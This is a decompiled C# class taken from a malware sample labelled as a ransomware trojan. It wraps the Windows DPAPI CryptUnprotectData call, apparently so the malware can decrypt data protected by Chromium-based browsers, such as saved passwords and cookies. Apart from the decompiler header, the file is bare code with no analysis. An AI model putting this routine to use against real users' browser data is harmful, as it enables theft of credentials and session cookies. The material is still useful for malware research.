// Decompiled with JetBrains decompiler
// Type: pazuzu.ChromiumBased.DPAPI
// Assembly: Private, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 345B90E2-2B0E-4FAF-8906-CB0787A05498
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-5dc3085c70289a9a4a0699d883af744e8777d3b9bbe07de15e4087bcce71d3d9.exe

using System;
using System.Runtime.InteropServices;

namespace pazuzu.ChromiumBased
{
  internal class DPAPI
  {
    [DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool CryptUnprotectData(
      ref DPAPI.DataBlob pCipherText,
      ref string pszDescription,
      ref DPAPI.DataBlob pEntropy,
      IntPtr pReserved,
      ref DPAPI.CryptprotectPromptstruct pPrompt,
      int dwFlags,
      ref DPAPI.DataBlob pPlainText);

    public static byte[] Decrypt(byte[] bCipher, byte[] bEntropy = null)
    {
      DPAPI.DataBlob pPlainText = new DPAPI.DataBlob();
      DPAPI.DataBlob pCipherText = new DPAPI.DataBlob();
      DPAPI.DataBlob pEntropy = new DPAPI.DataBlob();
      DPAPI.CryptprotectPromptstruct pPrompt = new DPAPI.CryptprotectPromptstruct()
      {
        cbSize = Marshal.SizeOf(typeof (DPAPI.CryptprotectPromptstruct)),
        dwPromptFlags = 0,
        hwndApp = IntPtr.Zero,
        szPrompt = (string) null
      };
      string empty = string.Empty;
      try
      {
        try
        {
          if (bCipher == null)
            bCipher = new byte[0];
          pCipherText.pbData = Marshal.AllocHGlobal(bCipher.Length);
          pCipherText.cbData = bCipher.Length;
          Marshal.Copy(bCipher, 0, pCipherText.pbData, bCipher.Length);
        }
        catch
        {
        }
        try
        {
          if (bEntropy == null)
            bEntropy = new byte[0];
          pEntropy.pbData = Marshal.AllocHGlobal(bEntropy.Length);
          pEntropy.cbData = bEntropy.Length;
          Marshal.Copy(bEntropy, 0, pEntropy.pbData, bEntropy.Length);
        }
        catch
        {
        }
        DPAPI.CryptUnprotectData(ref pCipherText, ref empty, ref pEntropy, IntPtr.Zero, ref pPrompt, 1, ref pPlainText);
        byte[] destination = new byte[pPlainText.cbData];
        Marshal.Copy(pPlainText.pbData, destination, 0, pPlainText.cbData);
        return destination;
      }
      catch
      {
      }
      finally
      {
        if (pPlainText.pbData != IntPtr.Zero)
          Marshal.FreeHGlobal(pPlainText.pbData);
        if (pCipherText.pbData != IntPtr.Zero)
          Marshal.FreeHGlobal(pCipherText.pbData);
        if (pEntropy.pbData != IntPtr.Zero)
          Marshal.FreeHGlobal(pEntropy.pbData);
      }
      return new byte[0];
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct CryptprotectPromptstruct
    {
      public int cbSize;
      public int dwPromptFlags;
      public IntPtr hwndApp;
      public string szPrompt;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct DataBlob
    {
      public int cbData;
      public IntPtr pbData;
    }
  }
}
